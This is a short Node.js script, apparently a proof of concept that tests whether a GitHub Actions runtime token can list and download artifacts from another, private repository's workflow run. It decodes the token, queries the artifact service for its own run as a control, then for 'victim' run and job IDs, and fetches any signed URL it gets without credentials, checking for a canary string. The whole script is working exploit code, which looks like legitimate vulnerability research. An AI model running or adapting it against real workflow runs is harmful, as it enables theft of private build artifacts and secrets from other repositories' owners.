
const tok=process.env.ACTIONS_RUNTIME_TOKEN, base=process.env.ACTIONS_RESULTS_URL;
const c=JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
const scp=Array.isArray(c.scp)?c.scp.join(' '):String(c.scp);
const m=/Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i.exec(scp);
const OR=m[1], OJ=m[2];
const VR=process.env.VICTIM_RUN, VJ=process.env.VICTIM_JOB, VN=process.env.VICTIM_NAME;
console.log("own  run/job :", OR, OJ);
console.log("victim run/job:", VR, VJ, VN);
const svc=base.replace(/\/$/,'')+"/twirp/github.actions.results.api.v1.ArtifactService/";
const H={"Content-Type":"application/json","Authorization":"Bearer "+tok};
async function call(meth,body){
  const r=await fetch(svc+meth,{method:"POST",headers:H,body:JSON.stringify(body)});
  const t=await r.text();
  return r.status+" "+t.slice(0,220);
}
(async()=>{
  console.log("--- CONTROL: own run ---");
  console.log("ListArtifacts OWN        :", await call("ListArtifacts",{workflow_run_backend_id:OR,workflow_job_run_backend_id:OJ}));
  console.log("GetSignedArtifactURL OWN :", await call("GetSignedArtifactURL",{workflow_run_backend_id:OR,workflow_job_run_backend_id:OJ,name:"ownart"}));
  console.log("--- ATTACK: private repo run ---");
  console.log("ListArtifacts VICTIM     :", await call("ListArtifacts",{workflow_run_backend_id:VR,workflow_job_run_backend_id:VJ}));
  console.log("ListArtifacts VICTIMrun+ownjob:", await call("ListArtifacts",{workflow_run_backend_id:VR,workflow_job_run_backend_id:OJ}));
  console.log("ListArtifacts ownrun+VICTIMjob:", await call("ListArtifacts",{workflow_run_backend_id:OR,workflow_job_run_backend_id:VJ}));
  const g=await call("GetSignedArtifactURL",{workflow_run_backend_id:VR,workflow_job_run_backend_id:VJ,name:VN});
  console.log("GetSignedArtifactURL VICTIM:", g);
  const u=/https:[^"\ ]+/.exec(g);
  if(u){
    console.log("SIGNED URL RETURNED - fetching with no credentials");
    const rr=await fetch(u[0]);
    const b=Buffer.from(await rr.arrayBuffer());
    console.log("fetch:",rr.status,b.length,"canary:", b.includes("CANARY_PRIV_8831"));
  }
})().catch(e=>console.log("ERR:",e.message));
